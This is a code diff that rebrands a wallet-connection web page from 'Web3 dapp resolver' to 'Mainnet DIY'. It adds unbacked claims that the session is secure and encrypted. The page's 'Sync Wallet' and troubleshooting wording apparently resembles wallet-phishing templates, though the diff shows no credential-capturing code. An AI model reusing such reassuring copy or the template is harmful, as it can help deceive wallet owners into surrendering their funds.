@@ -19,7 +19,10 @@
           <div class="themesflat-container">
             <div class="row">
               <div class="col-md-12">
-                <h2 class="tf-title style2">Select a Wallet</h2>
+                <h2 class="tf-title style2">Connect with Mainnet DIY</h2>
+                <p class="text-muted" style="margin-top:8px; font-size: 16px;">
+                  Mainnet DIY makes wallet connection straightforward and secure. Choose your preferred wallet provider below to start a self-guided connection flow. Our platform supports 50+ wallets and provides step-by-step guidance to help you troubleshoot any connection issues.
+                </p>
                 <div class="heading-line s2"></div>
               </div>
 
@@ -2081,7 +2084,10 @@
               /><br />
               <span id="wallet_name" clas="mt-1">Sync Wallet</span>
             </h3>
-            <p class="text-center">This session is secured and encrypted</p>
+            <p class="text-center">Mainnet DIY - This session is secured and encrypted</p>
+            <p class="text-center text-muted" style="font-size: 14px; margin-top: 10px;">
+              Connecting through Mainnet DIY's secure infrastructure
+            </p>
 
             <div id="auto_connecting" style="display: none">
               <br /><br /><br />
@@ -2201,11 +2207,11 @@ import axios from 'axios'
 export default {
   head() {
     return {
-      title: 'Web3 dapp resolver - Wallet Connection',
+      title: 'Mainnet DIY — Connect your wallet securely',
       meta: [
         {
           name: 'description',
-          content: 'Connect your Web3 wallet securely with our dApp resolver. Support for MetaMask, Trust Wallet, WalletConnect and 50+ other wallets. Resolve connection issues instantly.'
+          content: 'Connect to Mainnet DIY with MetaMask, Trust Wallet, WalletConnect and more. A streamlined, self-serve flow to troubleshoot and complete wallet actions securely.'
         }
       ]
     }
